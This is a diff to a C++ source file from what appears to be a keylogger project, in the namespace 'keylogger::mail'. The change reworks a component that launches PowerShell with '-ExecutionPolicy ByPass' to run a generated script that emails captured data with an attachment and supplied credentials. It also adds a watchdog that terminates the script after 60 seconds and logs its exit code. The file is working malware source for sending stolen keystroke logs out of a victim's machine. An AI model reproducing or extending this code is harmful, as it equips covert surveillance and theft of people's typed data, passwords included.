@@ -1,4 +1,5 @@
 #include "PowerShellMailSender.h"
+#include <future>
 
 namespace keylogger::mail
 {
@@ -16,23 +17,13 @@ PowerShellMailSender::PowerShellMailSender(std::unique_ptr<PowerShellSendMailScr
 
 bool PowerShellMailSender::sendMail(const Mail& mail, const Credentials& credentials)
 {
-    std::string attachmentsAsString;
-    if (auto begin = mail.attachments.begin(); begin != mail.attachments.end())
-    {
-        attachmentsAsString = *begin;
-        for (auto attachmentIter = std::next(begin); attachmentIter != mail.attachments.end();
-             ++attachmentIter)
-        {
-            attachmentsAsString += "::" + *attachmentIter;
-        }
-    }
-
     const bool scriptExists = scriptCreator->createScript(mail, credentials);
     if (!scriptExists)
     {
         return false;
     }
 
+    std::string attachmentsAsString = mail.attachment ? *mail.attachment : "";
     std::string parameters = "-ExecutionPolicy ByPass -File \"" + scriptCreator->getScriptFilePath() +
                              "\" -Subj \"" + stringReplace(mail.subject, "\"", "\\\"") + "\" -Body \"" +
                              stringReplace(mail.body, "\"", "\\\"") + "\" -Att \"" + attachmentsAsString +
@@ -59,18 +50,18 @@ bool PowerShellMailSender::sendMail(const Mail& mail, const Credentials& credent
     DWORD exitCode = 100;
     GetExitCodeProcess(shellExecuteInfo.hProcess, &exitCode);
 
-//    timer.setTimerCallback([&]() {
-//        WaitForSingleObject(shellExecuteInfo.hProcess, 60000);
-//        GetExitCodeProcess(shellExecuteInfo.hProcess, &exitCode);
-//        if ((int)exitCode == STILL_ACTIVE)
-//        {
-//            TerminateProcess(shellExecuteInfo.hProcess, 100);
-//        }
-//    });
+    auto terminateScriptProcess = [&]() {
+        WaitForSingleObject(shellExecuteInfo.hProcess, 60000);
+        GetExitCodeProcess(shellExecuteInfo.hProcess, &exitCode);
+        if ((int)exitCode == STILL_ACTIVE)
+        {
+            TerminateProcess(shellExecuteInfo.hProcess, 100);
+        }
+    };
 
-//    timer.setTotalNumberOfCalls(1L);
-//    timer.setInterval(10L);
-//    timer.start(true);
+    (void)std::async(std::launch::async, terminateScriptProcess);
+
+    utils::appendLog("Mail script code: " + std::to_string((int)exitCode));
 
     return static_cast<int>(exitCode) == successCodeFromScript;
 }
